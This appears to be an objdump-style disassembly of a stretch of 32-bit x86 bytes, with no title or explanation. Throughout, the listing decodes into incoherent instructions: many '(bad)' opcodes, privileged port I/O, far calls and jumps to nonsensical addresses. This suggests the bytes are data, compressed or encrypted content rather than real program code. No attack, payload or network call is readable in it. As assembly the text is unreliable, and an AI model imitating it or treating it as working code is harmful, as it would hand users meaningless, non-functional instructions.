  4062d3:	shl    DWORD PTR [edx+0x763dc49c],0x14
  4062da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062db:	gs add edi,edi
  4062de:	dec    eax
  4062df:	mov    bh,0x79
  4062e1:	or     al,0xbd
  4062e3:	dec    edi
  4062e4:	xchg   DWORD PTR [ebx+0x25],esp
  4062e7:	add    dl,BYTE PTR [edi]
  4062e9:	add    al,0xdd
  4062eb:	inc    edi
  4062ec:	lahf   
  4062ed:	mov    dl,0x40
  4062ef:	sbb    al,0xa
  4062f1:	das    
  4062f2:	xchg   edx,eax
  4062f3:	adc    BYTE PTR [edi+0x5722430e],0x1e
  4062fa:	test   BYTE PTR [ecx-0x48],ch
  4062fd:	call   0x235:0x104834d1
  406304:	and    cl,BYTE PTR [edi-0x601b5c3b]
  40630a:	in     eax,dx
  40630b:	mov    cl,0x1e
  40630d:	cs out dx,eax
  40630f:	mov    bl,0xf0
  406311:	test   BYTE PTR [edi+eiz*2],dh
  406314:	aaa    
  406315:	adc    al,0x83
  406317:	mov    ds:0xe3e32bdd,al
  40631c:	cmp    BYTE PTR [edx],al
  40631e:	les    ebp,FWORD PTR [ebp-0x7bed553e]
  406324:	sbb    al,0x16
  406326:	shl    DWORD PTR [eax-0x3180473a],1
  40632c:	je     0x406363
  40632e:	ret    
  40632f:	pop    esp
  406330:	out    0x94,al
  406332:	adc    al,0xda
  406334:	mov    ds:0x75c35ca,eax
  406339:	jg     0x406317
  40633b:	inc    ebp
  40633c:	enter  0x4a3f,0xce
  406340:	loop   0x4062c5
  406342:	aas    
  406343:	jmp    0x406382
  406345:	add    al,0xda
  406347:	scas   eax,DWORD PTR es:[edi]
  406348:	loope  0x4062d8
  40634a:	out    dx,eax
  40634b:	je     0x406370
  40634d:	adc    al,0x44
  40634f:	and    ch,BYTE PTR [eax+0xd]
  406352:	and    esi,DWORD PTR [ecx-0x47]
  406355:	lea    esi,[edx+0x60]
  406358:	arpl   WORD PTR [eax],si
  40635a:	out    dx,al
  40635b:	cmc    
  40635c:	in     al,0xd1
  40635e:	dec    edi
  40635f:	add    eax,0x795a452c
  406364:	xacquire xchg DWORD PTR [ebx],esi
  406367:	(bad)  
  406368:	rol    DWORD PTR [ebp-0x6b58f328],0x5f
  40636f:	xor    BYTE PTR [edx-0x7b],bh
  406372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406373:	das    
  406374:	clc    
  406375:	mov    esi,0x2c25051b
  40637a:	and    ebp,DWORD PTR [esp+edx*4]
  40637d:	shl    BYTE PTR [edi+0x6f],1
  406380:	dec    ecx
  406381:	inc    edx
  406382:	xchg   edx,eax
  406383:	push   ecx
  406384:	rcr    eax,cl
  406386:	jg     0x406336
  406388:	xor    edi,DWORD PTR [esi]
  40638a:	xchg   ebx,eax
  40638b:	cmp    esi,ebp
  40638d:	xchg   ebp,eax
  40638e:	xor    eax,0xb674f427
  406393:	das    
  406394:	stc    
  406395:	adc    DWORD PTR [edi],esi
  406397:	pop    ebp
  406398:	gs inc esi
  40639a:	jp     0x4063ca
  40639c:	js     0x406395
  40639e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40639f:	idiv   BYTE PTR [edx+esi*4]
  4063a2:	aas    
  4063a3:	and    ebx,esp
  4063a5:	imul   eax,DWORD PTR [edi+0x7a],0x75b15628
  4063ac:	test   al,0xe3
  4063ae:	bound  edx,QWORD PTR [ecx]
  4063b0:	jmp    0x9740fcea
  4063b5:	stos   DWORD PTR es:[edi],eax
  4063b6:	cmp    bh,BYTE PTR [edx+0x5883e07]
  4063bc:	loope  0x406372
  4063be:	sub    bl,BYTE PTR [edx+edi*2-0x73]
  4063c2:	aaa    
  4063c3:	loopne 0x406441
  4063c5:	inc    ecx
  4063c6:	enter  0xeffa,0xc8
  4063ca:	jnp    0x4063c9
  4063cc:	sub    ah,dl
  4063ce:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4063d0:	(bad)  [ebp-0x4c6de7d9]
  4063d6:	push   edi
  4063d7:	mov    esi,0x5e8b94f9
  4063dc:	rcl    BYTE PTR [ebx-0x793c7c5a],0x8
  4063e3:	fisttp QWORD PTR ds:0x7387f129
  4063e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063ea:	dec    esp
  4063eb:	mov    cl,0x3f
  4063ed:	inc    esi
  4063ee:	(bad)  [esi-0x15d07507]
  4063f4:	ss pop es
  4063f6:	lahf   
  4063f7:	lods   eax,DWORD PTR ds:[esi]
  4063f8:	jecxz  0x4063ed
  4063fa:	or     dh,al
  4063fc:	push   cs
  4063fd:	aas    
  4063fe:	dec    ecx
  4063ff:	xchg   ebp,eax
  406400:	push   edx
  406401:	mov    bl,0x19
  406403:	fbstp  TBYTE PTR [ebx+0x6e]
  406406:	fidivr WORD PTR [ecx]
  406408:	(bad)  
  406409:	dec    edx
  40640a:	std    
  40640b:	out    0x21,al
  40640d:	leave  
  40640e:	push   ss
  40640f:	ins    BYTE PTR es:[edi],dx
  406410:	gs add eax,0xbc975d6f
  406416:	jl     0x40645e
  406418:	inc    edx
  406419:	aad    0xd5
  40641b:	jmp    0xd9fe7760
  406420:	xor    DWORD PTR [edi+0x48],0xc223e69e
  406427:	scas   eax,DWORD PTR es:[edi]
  406428:	popf   
  406429:	scas   al,BYTE PTR es:[edi]
  40642a:	frstor [esi]
  40642c:	mov    BYTE PTR [ebp+0x8],ah
  40642f:	scas   al,BYTE PTR es:[edi]
  406430:	js     0x40647e
  406432:	pop    esi
  406433:	or     edi,DWORD PTR [edx+0x54]
  406436:	xor    al,BYTE PTR [ebx]
  406438:	cli    
  406439:	push   ecx
  40643a:	sbb    DWORD PTR [esi-0x41],0x4d6eb0b7
  406441:	test   esi,ebx
  406443:	bound  eax,QWORD PTR ds:0x3659fd25
  406449:	mov    cl,0x23
  40644b:	push   esp
  40644c:	(bad)  
  40644d:	loop   0x406402
  40644f:	jbe    0x40641c
  406451:	nop
  406452:	daa    
  406453:	icebp  
  406454:	in     al,0x30
  406456:	add    DWORD PTR [esi-0x9467f94],esi
  40645c:	outs   dx,DWORD PTR ds:[esi]
  40645d:	add    eax,eax
  40645f:	scas   eax,DWORD PTR es:[edi]
  406460:	adc    DWORD PTR [edx-0x6fd57b6f],esp
  406466:	mov    dl,0x1d
  406468:	loope  0x4063ef
  40646a:	dec    ebp
  40646b:	stos   DWORD PTR es:[edi],eax
  40646c:	add    DWORD PTR [ecx-0x7],0x78
  406470:	dec    ecx
  406471:	lods   al,BYTE PTR ds:[esi]
  406472:	adc    cl,BYTE PTR es:[edi+edx*4]
  406476:	xchg   ecx,eax
  406477:	jg     0x4064f3
  406479:	rol    BYTE PTR [ebx],cl
  40647b:	or     eax,0xc4991392
  406480:	xor    DWORD PTR [ebx],edi
  406482:	sbb    bh,BYTE PTR [ebx+0x61c24b6f]
  406488:	sub    ch,BYTE PTR [edx-0x77]
  40648b:	or     ah,BYTE PTR [eax+0x5e]
  40648e:	icebp  
  40648f:	scas   al,BYTE PTR es:[edi]
  406490:	jg     0x406452
  406492:	(bad)  
  406494:	pop    esp
  406495:	inc    ebx
  406496:	(bad)  
  406497:	xor    edx,edi
  406499:	sub    eax,0x9c635272
  40649e:	push   eax
  40649f:	xor    eax,edx
  4064a1:	test   esi,edx
  4064a3:	dec    ebp
  4064a4:	xchg   ebp,eax
  4064a5:	leave  
  4064a6:	jecxz  0x406466
  4064a8:	add    eax,0xee232376
  4064ad:	pop    ds
  4064ae:	rol    DWORD PTR [edx-0x5b],1
  4064b1:	adc    ah,BYTE PTR [edi-0xf]
  4064b4:	xor    al,0xd7
  4064b6:	gs rol bh,1
  4064b9:	loope  0x406539
  4064bb:	call   0x2fe2c4e3
  4064c0:	mov    ch,0x59
  4064c2:	add    ebx,ebx
  4064c4:	mov    bl,0x13
  4064c6:	dec    edx
  4064c7:	call   0x2f77a1e0
  4064cc:	jge    0x4064e6
  4064ce:	ret    0x1a75
  4064d1:	mov    bh,0x19
  4064d3:	sti    
  4064d4:	push   0x15
  4064d6:	out    0xae,al
  4064d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064d9:	inc    edi
  4064da:	lock pop ebp
  4064dc:	inc    ecx
  4064dd:	adc    BYTE PTR [edi+0x4a],0xfa
  4064e1:	cld    
  4064e2:	les    edi,FWORD PTR [ecx]
  4064e4:	adc    al,0x7e
  4064e6:	dec    edi
  4064e7:	jnp    0x40649d
  4064e9:	test   DWORD PTR [edx+0x28e7759d],ecx
  4064ef:	retf   
  4064f0:	sub    BYTE PTR [ebx],0x23
  4064f3:	stc    
  4064f4:	cdq    
  4064f5:	imul   esp,edi,0xffffff80
  4064f8:	out    0x23,al
  4064fa:	xchg   edi,eax
  4064fb:	icebp  
  4064fc:	in     eax,0xfb
  4064fe:	pop    ds
  4064ff:	(bad)  
  406501:	into   
  406502:	sahf   
  406503:	jp     0x406528
  406505:	cdq    
  406506:	mov    dl,0x90
  406508:	dec    edi
  406509:	jecxz  0x406576
  40650b:	repnz aad 0x13
  40650e:	int3   
  40650f:	iret   
  406510:	iret   
  406511:	rcr    BYTE PTR [edx-0x3df11d89],cl
  406517:	xor    BYTE PTR [ebx],bl
  406519:	jge    0x4064d6
  40651b:	loopne 0x406567
  40651d:	retf   0xae4c
  406520:	outs   dx,BYTE PTR ds:[esi]
  406521:	push   ds
  406522:	cmp    eax,0x97ddca76
  406527:	xchg   dl,bh
  406529:	pop    edx
  40652a:	scas   eax,DWORD PTR es:[edi]
  40652b:	push   eax
  40652c:	stos   BYTE PTR es:[edi],al
  40652d:	push   ds
  40652e:	jge    0x406578
  406530:	mov    eax,0xbab04b85
  406535:	ds int 0x1e
  406538:	scas   al,BYTE PTR es:[edi]
  406539:	ds and esp,edi
  40653c:	jno    0x406558
  40653e:	test   al,0x7b
  406540:	retf   0x86b3
  406543:	icebp  
  406544:	sbb    ebp,DWORD PTR [edx+eax*4-0x2ffb9bf3]
  40654b:	es and ebp,eax
  40654e:	mov    esi,0xb807c34d
  406553:	(bad)  
  406555:	adc    eax,DWORD PTR [ebp-0x66]
  406558:	je     0x406520
  40655a:	addr16 xor eax,0x65c2fafd
  406560:	scas   al,BYTE PTR es:[edi]
  406561:	(bad)  
  406562:	mov    bh,0xc3
  406564:	test   ecx,edx
  406566:	loope  0x406516
  406568:	(bad)  
  406569:	imul   ebp,DWORD PTR [edi+0x64],0x28
  40656d:	push   ecx
  40656e:	cmp    BYTE PTR [ebp-0x6],ch
  406571:	retf   
  406572:	sub    ebx,edi
  406574:	xor    BYTE PTR [ebp-0x16],0x77
  406578:	fiadd  WORD PTR [ebp-0x4e87786f]
  40657e:	mov    eax,ebx
  406580:	jno    0x4065d6
  406582:	and    edx,esp
  406584:	push   ecx
  406585:	jmp    0x4065bb
  406587:	retf   0xed7c
  40658a:	mov    ebx,0x66c735f1
  40658f:	repnz fadd DWORD PTR ss:[esi+0x47]
  406594:	and    eax,DWORD PTR [ecx-0x2a4d2152]
  40659a:	ficomp WORD PTR [edx+ebx*4]
  40659d:	adc    ebx,DWORD PTR [eax]
  40659f:	lock out dx,eax
  4065a1:	ret    
  4065a2:	je     0x4065fa
  4065a4:	scas   al,BYTE PTR es:[edi]
  4065a5:	mov    ss,eax
  4065a7:	sub    ch,BYTE PTR [edx+0x5d]
  4065aa:	and    esp,DWORD PTR [edx]
  4065ac:	scas   eax,DWORD PTR es:[edi]
  4065ad:	scas   eax,DWORD PTR es:[edi]
  4065ae:	adc    DWORD PTR [ebp+ecx*1+0x26a9c785],esp
  4065b5:	stos   DWORD PTR es:[edi],eax
  4065b6:	jno    0x4065a3
  4065b8:	cld    
  4065b9:	push   ebp
  4065ba:	and    ebx,ebp
  4065bc:	cmp    eax,0xf591089c
  4065c1:	xchg   edx,esp
  4065c3:	icebp  
  4065c4:	mov    WORD PTR [esi+0xfe9afc1],gs
  4065ca:	dec    eax
  4065cb:	retf   
  4065cc:	and    eax,DWORD PTR [edx-0x1d4a102d]
  4065d2:	call   FWORD PTR [ebx]
  4065d4:	mov    ah,0x13
  4065d6:	xor    BYTE PTR [ecx+0x34],ah
  4065d9:	jne    0x406572
  4065db:	pop    ss
  4065dc:	push   eax
  4065dd:	test   edx,eax
  4065df:	add    cl,BYTE PTR [esi+0x165cc4a7]
  4065e5:	xchg   esi,eax
  4065e6:	and    BYTE PTR [esi-0x12344dfd],ch
  4065ec:	push   esi
  4065ed:	int3   
  4065ee:	lods   al,BYTE PTR ds:[esi]
  4065ef:	jmp    0x8079daee
  4065f4:	cmp    al,BYTE PTR ds:[edi]
  4065f7:	daa    
  4065f8:	xchg   ebp,eax
  4065f9:	test   DWORD PTR [ebx+edx*4+0x10dab92d],edx
  406600:	loope  0x40667b
  406602:	and    esp,DWORD PTR [edi+0x7c04581d]
  406608:	and    DWORD PTR [ebp-0x2c070e47],0x3c
  40660f:	(bad)  
  406610:	aaa    
  406611:	(bad)  
  406613:	out    dx,al
  406614:	and    ecx,esi
  406616:	push   0xffffff9d
  406618:	jb     0x40659c
  40661a:	in     al,0xc0
  40661c:	xchg   edx,eax
  40661d:	pop    ss
  40661e:	sar    BYTE PTR [esi+0x71a3a2a3],1
  406624:	push   0xfad19373
  406629:	sub    al,0x3a
  40662b:	inc    esp
  40662c:	imul   ebx,DWORD PTR [esi],0x85804bef
  406632:	mov    esp,0x2d8fea62
  406637:	push   cs
  406638:	sbb    bh,BYTE PTR [esi+0x398dbc2a]
  40663e:	aaa    
  40663f:	cs jo  0x4066b0
  406642:	cwde   
  406643:	int    0xa0
  406645:	adc    edx,DWORD PTR [ecx+0x8929b37]
  40664b:	cmc    
  40664c:	pop    ebp
  40664d:	test   eax,0xa32cd9c2
  406652:	ret    0x3798
  406655:	jo     0x4065ee
  406657:	mov    al,ds:0x375e89db
  40665c:	(bad)  
  40665d:	aam    0x67
  40665f:	push   esi
  406660:	xchg   BYTE PTR [edi+eiz*4+0x5bd7541f],dl
  406667:	pop    eax
  406668:	mov    edi,esi
  40666a:	aas    
  40666b:	jl     0x406649
  40666d:	loope  0x4065f4
  40666f:	mov    ds:0x4c32ee2c,eax
  406674:	std    
  406675:	jl     0x40667d
  406677:	pop    ds
  406678:	imul   esi,esp,0xffffffe6
  40667b:	in     eax,dx
  40667c:	ja     0x4066f1
  40667e:	bnd jmp 0xe062ee2e
  406684:	and    ch,bl
  406686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406687:	push   0x53
  406689:	rcl    DWORD PTR [edx-0x26],cl
  40668c:	aas    
  40668d:	outs   dx,BYTE PTR ds:[esi]
  40668e:	and    eax,0xf43b8950
  406693:	jns    0x4066d6
  406695:	pop    esi
  406696:	imul   ecx,DWORD PTR [esp+ebx*1-0x43],0x898b87cf
  40669e:	cmovl  edi,DWORD PTR [edi+0x2d033cd9]
  4066a5:	mov    cs,WORD PTR [ebx+0x67]
  4066a8:	fld    st(5)
  4066aa:	(bad)  [edx+ebp*4+0x4a792d94]
  4066b1:	nop
  4066b2:	xchg   ecx,eax
  4066b3:	test   al,0xc1
  4066b5:	clc    
  4066b6:	cli    
  4066b7:	and    BYTE PTR [ebp-0x2cf515f5],bh
  4066bd:	xor    cl,cl
  4066bf:	out    dx,eax
  4066c0:	push   edi
  4066c1:	or     al,0xcf
  4066c3:	inc    edx
  4066c4:	push   ebx
  4066c5:	jns    0x40666c
  4066c7:	xchg   esi,eax
  4066c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066c9:	daa    
  4066ca:	lods   eax,DWORD PTR ds:[esi]
  4066cb:	or     al,0x66
  4066cd:	mov    esp,0x19d944e1
  4066d2:	stos   DWORD PTR es:[edi],eax
  4066d3:	dec    esi
  4066d4:	jo     0x40668d
  4066d6:	and    DWORD PTR [esi+0x67c1f7f5],ecx
  4066dc:	jnp    0x406666
  4066de:	(bad)  
  4066df:	mov    al,ds:0xd294f0a1
  4066e4:	loope  0x4066d8
  4066e6:	aas    
  4066e7:	es out 0xb8,al
  4066ea:	mov    al,0x13
  4066ec:	lea    ebp,[ebx]
  4066ee:	mov    cs,WORD PTR [eax-0x38b0108c]
  4066f4:	push   es
  4066f5:	dec    ecx
  4066f6:	mov    esp,0xd6c46f2e
  4066fb:	push   es
  4066fc:	rcl    DWORD PTR [ecx],0xfa
  4066ff:	sub    eax,0x996c0b36
  406704:	pop    ss
  406705:	xor    BYTE PTR [esi-0x28f2a001],bl
  40670b:	and    dh,al
  40670d:	lock sub dl,BYTE PTR [edi+0xb]
  406711:	addr16 sub ecx,ecx
  406714:	shl    DWORD PTR [edx+0x4c],0x3d
  406718:	push   ecx
  406719:	pop    ebp
  40671a:	add    BYTE PTR [edx-0x2b5ddbf],al
  406720:	rcl    BYTE PTR [eax+0x1b1bcec1],1
  406726:	(bad)  
  406727:	and    dh,dh
  406729:	adc    ah,ah
  40672b:	shl    BYTE PTR [ecx+0x55],cl
  40672e:	loope  0x406756
  406730:	lahf   
  406731:	sbb    al,ah
  406733:	adc    edi,DWORD PTR [ebp+0x2b]
  406736:	repnz mov dh,0x74
  406739:	lods   eax,DWORD PTR ds:[esi]
  40673a:	adc    al,0x67
  40673c:	add    BYTE PTR [edx-0x758d5438],dh
  406742:	or     al,0x6b
  406744:	shl    DWORD PTR [esi+0xbfda0fa],0x2a
  40674b:	aad    0x31
  40674d:	xor    ah,dh
  40674f:	mov    ch,0x7a
  406751:	or     eax,0xf1c12eb8
  406756:	call   DWORD PTR [esi-0x285291c9]
  40675c:	ins    DWORD PTR es:[edi],dx
  40675d:	xor    al,0xe1
  40675f:	mov    DWORD PTR [ebp-0x36bd53c9],0xe8314a66
  406769:	mov    ecx,es
  40676b:	jmp    0xdd64:0x38410e1b
  406772:	and    ah,bl
  406774:	push   edi
  406775:	daa    
  406776:	fsub   DWORD PTR ds:0xed71fad4
  40677c:	push   cs
  40677d:	iret   
  40677e:	lods   al,BYTE PTR ds:[esi]
  40677f:	jmp    0xe0b998cc
  406784:	int    0x48
  406786:	bound  ebp,QWORD PTR [edx+0x1]
  406789:	and    DWORD PTR [edx-0x5d],edx
  40678c:	xor    ebp,esp
  40678e:	mov    ah,0x95
  406790:	std    
  406791:	rcl    DWORD PTR [edi+eiz*1+0x4fbf7231],0x0
  406799:	dec    ebx
  40679a:	fnsave [ecx]
  40679c:	dec    esi
  40679d:	push   0x9919df1f
  4067a2:	sbb    eax,0xb3540caf
  4067a7:	mov    ebp,0x57b4947e
  4067ac:	jo     0x406785
  4067ae:	aaa    
  4067af:	pop    ss
  4067b0:	mov    edx,DWORD PTR [esp+edi*2-0x67]
  4067b4:	add    BYTE PTR [edi],dh
  4067b6:	das    
  4067b7:	es (bad) 
  4067b9:	lds    eax,FWORD PTR [ebx]
  4067bb:	adc    eax,DWORD PTR [ebx+0x2b]
  4067be:	and    DWORD PTR [edx+0x74],edx
  4067c1:	call   0xf574:0xdb00405a
  4067c8:	jb     0x406832
  4067ca:	neg    DWORD PTR [ebx+0x23faadc1]
  4067d0:	xor    DWORD PTR [eax],ebx
  4067d2:	gs xchg esi,eax
  4067d4:	cwde   
  4067d5:	popf   
  4067d6:	sbb    ebx,esp
  4067d8:	ret    
  4067d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067da:	push   0x1c9b6965
  4067df:	ss mov dh,0x67
  4067e2:	test   ecx,0x464c4b93
  4067e8:	jg     0x406834
  4067ea:	sbb    al,0x7f
  4067ec:	cwde   
  4067ed:	ret    
  4067ee:	loope  0x4067b5
  4067f0:	aas    
  4067f1:	push   0xffffffab
  4067f3:	fld    TBYTE PTR [ecx+edi*4+0x20]
  4067f7:	dec    ebx
  4067f8:	ret    0xd868
  4067fb:	jg     0x406832
  4067fd:	xchg   ebp,eax
  4067fe:	adc    DWORD PTR [ecx-0x2d91e0cc],0x26f175f4
  406808:	scas   eax,DWORD PTR es:[edi]
  406809:	xchg   esp,eax
  40680a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40680b:	adc    esi,DWORD PTR [edi+0x74eb482b]
  406811:	dec    edx
  406812:	retf   0x808
  406815:	add    eax,DWORD PTR [edx+0x527bfca0]
  40681b:	mov    ?,WORD PTR [edi]
  40681d:	xchg   edx,eax
  40681e:	(bad)  
  40681f:	(bad)  
  406820:	mov    ebp,0x32cd5b75
  406825:	push   edi
  406826:	out    0x31,eax
  406828:	ds aas 
  40682a:	push   0x210f8b80
  40682f:	or     al,0xab
  406831:	ret    0xacd0
  406834:	add    BYTE PTR [edx],0x3c
  406837:	cs mov edx,0x52f4e341
  40683d:	pushf  
  40683e:	fisub  WORD PTR [eax*8+0x25c6417]
  406845:	mov    ss,ebx
  406847:	adc    cl,BYTE PTR [edx-0x2d461843]
  40684d:	bound  esi,QWORD PTR [edi]
  40684f:	xchg   ebx,eax
  406850:	(bad)  
  406851:	out    0x58,al
  406853:	in     eax,dx
  406854:	cld    
  406855:	fs je  0x406820
  406858:	xchg   ebp,eax
  406859:	cdq    
  40685a:	stc    
  40685b:	mov    dh,0x56
  40685d:	push   ecx
  40685e:	jecxz  0x406811
  406860:	sbb    eax,0x13e033a5
  406865:	idiv   BYTE PTR ds:0x5278e06a
  40686b:	add    bh,BYTE PTR [edi]
  40686d:	sbb    eax,0xe8bd7c7d
  406872:	mov    ds:0xda5f323c,al
  406877:	mov    ds:0x8005913e,al
  40687c:	xor    BYTE PTR [edi],cl
  40687e:	imul   DWORD PTR [ebp+0x16]
  406881:	ret    0x4f0c
  406884:	jl     0x40688a
  406886:	and    edi,DWORD PTR [ecx]
  406888:	ins    DWORD PTR es:[edi],dx
  406889:	xchg   esp,eax
  40688a:	cmp    DWORD PTR [ecx+0x67],0x8b800ed7
  406891:	xchg   edx,eax
  406892:	aas    
  406893:	enter  0xd7b0,0x85
  406897:	stc    
  406898:	scas   eax,DWORD PTR es:[edi]
  406899:	and    dh,BYTE PTR [edx]
  40689b:	add    ebx,edi
  40689d:	ins    DWORD PTR es:[edi],dx
  40689e:	push   es
  40689f:	sub    al,0x80
  4068a1:	hlt    
  4068a2:	push   ds
  4068a3:	in     eax,dx
  4068a4:	(bad)  fs:[esi+0x7e3f56e9]
  4068ab:	loopne 0x406871
  4068ad:	and    ebx,ebx
  4068af:	imul   edx,ecx,0xffffffb4
  4068b2:	lea    esi,ds:0xceb3d3b6
  4068b8:	and    DWORD PTR ds:0x8b3f7052,0x54bde15c
  4068c2:	sub    BYTE PTR ds:0x8c866c32,0x3e
  4068c9:	jecxz  0x406942
  4068cb:	or     BYTE PTR [ecx],0xf
  4068ce:	mov    esp,0x88c26a95
  4068d3:	cli    
  4068d4:	stos   DWORD PTR es:[edi],eax
  4068d5:	add    al,BYTE PTR [ecx+0x22]
  4068d8:	mov    esp,0x5236e941
  4068dd:	std    
  4068de:	fiadd  WORD PTR [edi+0x22643d91]
  4068e4:	or     eax,DWORD PTR [edi]
  4068e6:	rcl    DWORD PTR [edx-0x7718a4a3],cl
  4068ec:	lahf   
  4068ed:	bound  ebx,QWORD PTR [edx+esi*4-0x49d76ce8]
  4068f4:	ds mov esi,0x18cbb19
  4068fa:	ret    0x8270
  4068fd:	ja     0x4068ef
  4068ff:	push   0xffffffac
  406901:	icebp  
  406902:	push   edx
  406903:	retf   
  406904:	aas    
  406905:	pop    ebp
  406906:	(bad)  
  406907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406908:	mov    ebp,0x32b8b19b
  40690d:	enter  0xa8ce,0x3d
  406911:	push   esp
  406912:	imul   edx,ebp,0xffffffe7
  406915:	jg     0x406991
  406917:	fbld   TBYTE PTR [esi-0x1e913867]
  40691d:	push   esp
  40691e:	lahf   
  40691f:	adc    ebp,DWORD PTR [ecx]
  406921:	xchg   esp,eax
  406922:	dec    ebp
  406923:	mov    dl,0x8f
  406925:	xlat   BYTE PTR ds:[ebx]
  406926:	sub    eax,0x3fe78b6a
  40692b:	push   edi
  40692c:	sbb    al,BYTE PTR [edx+0x10cb0685]
  406932:	xor    dl,BYTE PTR [ebp-0x10]
  406935:	test   DWORD PTR [esi],0x5af40899
  40693b:	in     eax,0xa8
  40693d:	(bad)  
  40693e:	and    eax,0xebf48f25
  406943:	into   
  406944:	pusha  
  406945:	jge    0x406904
  406947:	mov    dl,0xa3
  406949:	pop    edi
  40694a:	dec    esi
  40694b:	mov    dh,0x94
  40694d:	adc    cl,BYTE PTR [edi-0x41]
  406950:	jbe    0x406986
  406952:	div    BYTE PTR ds:0xe0b38f47
  406958:	out    0x57,al
  40695a:	push   0x58
  40695c:	fs repz sbb al,dl
  406960:	jmp    0x406993
  406962:	(bad)  
  406963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406964:	out    0xe9,eax
  406966:	xor    edi,ebx
  406968:	push   cs
  406969:	cdq    
  40696a:	and    al,0x3e
  40696c:	leave  
  40696d:	push   esp
  40696e:	out    0x64,eax
  406970:	lahf   
  406971:	xchg   edx,eax
  406972:	mov    WORD PTR [esi+0x59],es
  406975:	or     al,BYTE PTR [ebp+0x31]
  406978:	push   esp
  406979:	xchg   esp,eax
  40697a:	retf   0x2be1
  40697d:	xlat   BYTE PTR ds:[ebx]
  40697e:	fcmovb st,st(1)
  406980:	mov    edi,DWORD PTR [edi]
  406982:	imul   esp,DWORD PTR [edx+esi*2],0x62
  406986:	fisub  WORD PTR [esi]
  406988:	mov    al,0xa0
  40698a:	pop    esi
  40698b:	ins    DWORD PTR es:[edi],dx
  40698c:	jg     0x4069cb
  40698e:	test   esp,ebx
  406990:	ret    0x3299
  406993:	aad    0x74
  406995:	mov    ch,0x6
  406997:	pop    edi
  406998:	mov    esp,esi
  40699a:	xchg   edi,eax
  40699b:	in     eax,dx
  40699c:	in     al,0x84
  40699e:	add    al,0xe9
  4069a0:	stos   DWORD PTR es:[edi],eax
  4069a1:	dec    esi
  4069a2:	retf   
  4069a3:	loopne 0x4069a5
  4069a5:	mov    dl,0x1f
  4069a7:	imul   eax,DWORD PTR [esi-0x40caa8a8],0x2d
  4069ae:	mov    bl,0xb1
  4069b0:	out    0xa4,al
  4069b2:	mov    ch,0xba
  4069b4:	pop    esp
  4069b5:	bt     DWORD PTR [ebx],edx
  4069b8:	mov    ebp,0x327a2e59
  4069bd:	xchg   ebp,eax
  4069be:	int    0x24
  4069c0:	ds add bl,al
  4069c3:	adc    BYTE PTR [ebx+0xf],0x52
  4069c7:	rol    ah,cl
  4069c9:	ret    0x8061
  4069cc:	xchg   esi,eax
  4069cd:	add    al,BYTE PTR [esi]
  4069cf:	bound  ebx,QWORD PTR [eax+eax*2-0x2894fb77]
  4069d6:	sbb    ch,BYTE PTR [eax-0xbc07975]
  4069dc:	aam    0xe5
  4069de:	test   DWORD PTR [edi-0x1ccd741a],ebp
  4069e4:	loope  0x406a58
  4069e6:	push   es
  4069e7:	or     eax,0xed16f490
  4069ec:	jl     0x4069ab
  4069ee:	xchg   ebp,eax
  4069ef:	jmp    0xe0db55f7
  4069f4:	repz add al,0x44
  4069f7:	push   0x6b
  4069f9:	sbb    al,0x52
  4069fb:	xor    BYTE PTR [edi],bh
  4069fd:	dec    ebx
  4069fe:	clc    
  4069ff:	mov    bl,0x9c
  406a01:	add    edi,DWORD PTR [edi]
  406a03:	outs   dx,DWORD PTR ds:[esi]
  406a04:	fs stos BYTE PTR es:[edi],al
  406a06:	sbb    ecx,DWORD PTR [edi-0x15]
  406a09:	mov    ebp,0xe709c8
  406a0e:	jmp    0x90d9ccf2
  406a13:	shl    DWORD PTR [edx],cl
  406a15:	push   esp
  406a16:	icebp  
  406a17:	jl     0x4069ac
  406a19:	xchg   esp,eax
  406a1a:	cwde   
  406a1b:	pop    eax
  406a1c:	cli    
  406a1d:	xlat   BYTE PTR ds:[ebx]
  406a1e:	mov    dl,0xa9
  406a20:	mov    ecx,DWORD PTR [ebx]
  406a22:	pop    esi
  406a23:	js     0x406a77
  406a25:	xchg   esi,ebx
  406a27:	or     edi,edx
  406a29:	push   ds
  406a2a:	fs inc edi
  406a2c:	pop    ds
  406a2d:	or     eax,0x2ef8cd3
  406a32:	out    0x63,eax
  406a34:	jmp    0xedf4:0xdad92b62
  406a3b:	in     eax,dx
  406a3c:	push   0xffffffb9
  406a3e:	xchg   edi,eax
  406a3f:	jmp    0xe04c3f49
  406a44:	pop    ebx
  406a45:	mov    dh,0x1d
  406a47:	push   0xffffff80
  406a49:	xchg   BYTE PTR [edx+0x7d],dl
  406a4c:	aas    
  406a4d:	pushf  
  406a4e:	fwait
  406a4f:	bsr    edi,DWORD PTR [ebp+0x2a]
  406a53:	js     0x406a87
  406a55:	xchg   ebx,eax
  406a56:	fsub   DWORD PTR [ebx-0x7fb96dc2]
  406a5c:	pushf  
  406a5d:	nop/reserved BYTE PTR [ecx+0x1c]
  406a61:	ret    0x7512
  406a64:	popa   
  406a65:	add    al,BYTE PTR [esi+edi*2]
  406a68:	xchg   edx,eax
  406a69:	inc    ecx
  406a6a:	fwait
  406a6b:	jae    0x406abf
  406a6d:	push   edx
  406a6e:	fisubr WORD PTR [ebp-0x2d]
  406a71:	sbb    al,0x64
  406a73:	inc    ecx
  406a74:	jns    0x406ab4
  406a76:	rcr    ecx,cl
  406a78:	in     al,0x8a
  406a7a:	out    0xe0,eax
  406a7c:	pop    eax
  406a7d:	out    0x2e,al
  406a7f:	gs push edx
  406a81:	hlt    
  406a82:	ja     0x406a71
  406a84:	fistp  QWORD PTR [esi+0x79]
  406a87:	jmp    0xe37613b8
  406a8c:	sbb    DWORD PTR [esi-0x688150d5],esi
  406a92:	mov    edx,0xcf5baed5
  406a97:	aas    
  406a98:	inc    edi
  406a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
